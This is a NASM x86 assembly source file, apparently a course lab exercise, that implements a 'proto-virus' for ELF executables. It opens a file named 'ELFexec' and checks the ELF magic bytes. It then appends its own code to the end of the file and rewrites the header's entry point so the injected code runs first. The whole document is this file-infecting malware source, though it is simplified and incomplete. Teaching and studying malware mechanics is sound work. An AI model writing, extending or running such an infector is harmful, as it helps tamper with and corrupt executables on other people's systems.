%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define stdout 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define	ELFHDR_size	52
%define	load_address	0x08048000

%define EI_MAG0		0		; File identification byte 0 index 
%define ELFMAG0		0x7f		; Magic number byte 0 

%define EI_MAG1		1		; File identification byte 1 index 
%define ELFMAG1		'E'		; Magic number byte 1 

%define EI_MAG2		2		; File identification byte 2 index 
%define ELFMAG2		'L'		; Magic number byte 2 

%define EI_MAG3		3		; File identification byte 3 index 
%define ELFMAG3		'F'		; Magic number byte 3 
	
	global _start

	section .text
_start:     	    
            push    ebp
            mov     ebp, esp
            sub     esp, STK_RES                    ; Set up ebp and reserve space on the stack for local storage
            call    get_my_loc                      ; find OutStr address in run time, ecx <-- next_i
            mov     edx, next_i                     ;......... edx <-- next_i
            sub     edx, OutStr                     ;......... edx <-- next_i - OutStr
            sub     ecx, edx                        ;......... ecx <-- next_i - (next_i - OutStr)
            write   stdout, ecx, 31                 ; print OutStr
            open    FileName, RDWR, 0
            mov     [ebp-4], eax                    ; [ebp-4] <-- fd
            cmp     dword [ebp-4], -1
            je      VirusExitAbNoramlly
            mov     ebx, ebp
            sub     ebx, 8                          ; ebx = ebp-8
            read    [ebp-4], ebx, 4                 ; [ebp-8] =? "\0ELF"
            cmp     byte [ebp-8+EI_MAG0], ELFMAG0
            jne     VirusExitAbNoramlly
            cmp     byte [ebp-8+EI_MAG1], ELFMAG1
            jne     VirusExitAbNoramlly
            cmp     byte [ebp-8+EI_MAG2], ELFMAG2
            jne     VirusExitAbNoramlly
            cmp     byte [ebp-8+EI_MAG3], ELFMAG3
            jne     VirusExitAbNoramlly
            lseek   [ebp-4], 0, SEEK_END
            mov     [ebp-8], eax                    ; [ebp-8] <-- file original size
            write   [ebp-4], _start, 1024           ; add _Start to the enf of ELFexec
            lseek   [ebp-4], 0, SEEK_SET            ; bring file location back to beginning of file
            mov     ebx, ebp
            sub     ebx, 8                          ;
            sub     ebx, ELFHDR_size                ; ebx = ebp-8-52
            read    [ebp-4], ebx, ELFHDR_size       ; [ebp-60] <-- ELF header
            mov     eax, [ebp-8]                    ; eax <-- file original size
            add     eax, load_address               ; eax <-- file original size + load_address
            mov     [ebp-60+ENTRY], eax             ; ehdr.entry <-- file original size + load_address
            lseek   [ebp-4], 0, SEEK_SET            ; bring file location back to beginning of file
            mov     ebx, ebp
            sub     ebx, 60
            write   [ebp-4], ebx, ELFHDR_size       ; replace ELF header with the modified ELF header

VirusExitNoramlly:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         
VirusExitAbNoramlly:
       exit 1            ; exit if error occured
       

	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExitNoramlly
virus_end:

get_my_loc:
        call next_i
next_i:
        pop ecx
        ret




